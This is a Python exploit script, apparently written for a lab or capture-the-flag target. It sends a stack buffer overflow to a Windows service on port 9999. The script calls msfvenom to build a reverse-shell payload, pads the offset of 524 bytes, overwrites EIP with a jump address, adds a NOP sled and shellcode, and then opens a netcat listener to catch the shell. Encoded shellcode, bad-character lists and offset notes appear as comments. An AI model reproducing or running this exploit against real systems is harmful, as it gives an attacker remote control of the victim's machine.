import socket
import sys
import os

# By firedragon9511

if(len(sys.argv) < 3):
	print("Uso: " + sys.argv[0] + " [LHOST] [LPORT] [RHOST]")
	sys.exit()



LHOST = sys.argv[1]
LPORT = sys.argv[2]
RHOST = sys.argv[3]

shell = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" -f c -b \"\\x00\\x0A\\x0D\" | grep \"\\x\"> shell.txt"


print(shell)

os.system(shell)

f = open("shell.txt", "r");
payload_shell = f.read()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((RHOST,9999))

overflow = [""]

for n in range(0, 40):
        a = 100*n
        #print("A" * a)
        overflow.append("A" * (a))

payload = eval("("+ payload_shell.replace(";","") +")" )
'''("\xbe\x35\xe6\x35\x97\xd9\xc8\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x59\x83\xc5\x04\x31\x75\x10\x03\x75\x10\xd7\x13\xc9\x7f\x98"
"\xdc\x32\x80\xc6\xed\xe0\xe4\x8d\x5c\x35\x6e\xc3\x6c\xbe\x22"
"\xf7\xe5\x25\x49\x85\xdd\x94\xb1\x66\xa9\x9d\x6b\x49\x15\x8d"
"\x48\xc8\xe9\xcc\x9c\x2a\xd3\x1e\xd1\x2b\x14\xe9\x9f\xc4\xc8"
"\xbd\xd4\x48\xfd\xca\xa9\x50\xfc\x1c\xa6\xe8\x86\x19\x79\x9c"
"\x3a\x23\xaa\x0c\x48\x7b\x6a\xad\x9d\xf7\x22\xb5\xa4\xc1\xc7"
"\xf9\xef\xe0\xd8\x8a\xc4\x89\x26\x5a\x15\x4e\x84\xa3\x99\x43"
"\xd4\xe4\x1e\xbc\xa3\x1e\x5d\x41\xb4\xe5\x1f\x9d\x31\xf9\xb8"
"\x56\xe1\xdd\x39\xba\x74\x96\x36\x77\xf2\xf0\x5a\x86\xd7\x8b"
"\x67\x03\xd6\x5b\xee\x57\xfd\x7f\xaa\x0c\x9c\x26\x16\xe2\xa1"
"\x38\xfe\x5b\x04\x33\xed\x8a\x38\xbc\xed\xb2\x64\x2a\x21\x7f"
"\x97\xaa\x2d\x08\xe4\x98\xf2\xa2\x62\x90\x7b\x6d\x74\xa1\x6c"
"\x8e\xaa\x09\xfc\x70\x4b\x69\xd4\xb6\x1f\x39\x4e\x1e\x20\xd2"
"\x8e\x9f\xf5\x4e\x85\x37\xfc\x85\x83\xae\x68\x9b\xb3\x21\x34"
"\x12\x55\x11\x96\x74\xca\xd2\x46\x34\xba\xba\x8c\xbb\xe5\xdb"
"\xae\x16\x8e\x76\x41\xce\xe6\xee\xf8\x4b\x7c\x8e\x05\x46\xf8"
"\x90\x8e\x62\xfc\x5f\x67\x07\xee\x88\x10\xe7\xee\x48\xb5\xe7"
"\x84\x4c\x1f\xb0\x30\x4f\x46\xf6\x9e\xb0\xad\x85\xd9\x4f\x30"
"\xbf\x92\x66\xa6\xff\xcc\x86\x26\xff\x0c\xd1\x2c\xff\x64\x85"
"\x14\xac\x91\xca\x80\xc1\x09\x5f\x2b\xb3\xfe\xc8\x43\x39\xd8"
"\x3f\xcc\xc2\x0f\x3c\x0b\x3c\xcd\x6b\xb4\x54\x2d\x2c\x44\xa4"
"\x47\xac\x14\xcc\x9c\x83\x9b\x3c\x5c\x0e\xf4\x54\xd7\xdf\xb6"
"\xc5\xe8\xf5\x17\x5b\xe8\xfa\x83\x6c\x93\x73\x33\x8d\x64\x9a"
"\x50\x8e\x64\xa2\x66\xb3\xb2\x9b\x1c\xf2\x06\x98\x2f\x41\x2a"
"\x89\xa5\xa9\x78\xc9\xef")'''
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xF7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"
overflow = ("A" * 524) + "\xF3\x12\x17\x31" + ("\x90"*50) + payload #("A" * 172)

# Payload -> 381 Bytes
# Bad Chars -> 00 0A 0D
# overflow = pattern

# JMP EBP -> 311712F3
# EIP PATTERN -> 0x35724134
# OFFSET PATTERN -> 524

print("Sending bytes: "+ str(len(overflow)))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((RHOST,9999))
s.send(overflow+"\r\n")
s.recv(1024)

os.system("nc -vnlp " + LPORT)

'''for o in overflow:
	print("Sending bytes: "+ str(len(o)))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	c = s.connect(("10.11.26.108",9999))
	s.send(o+"\r\n")
	s.recv(1024)
	s.close()'''
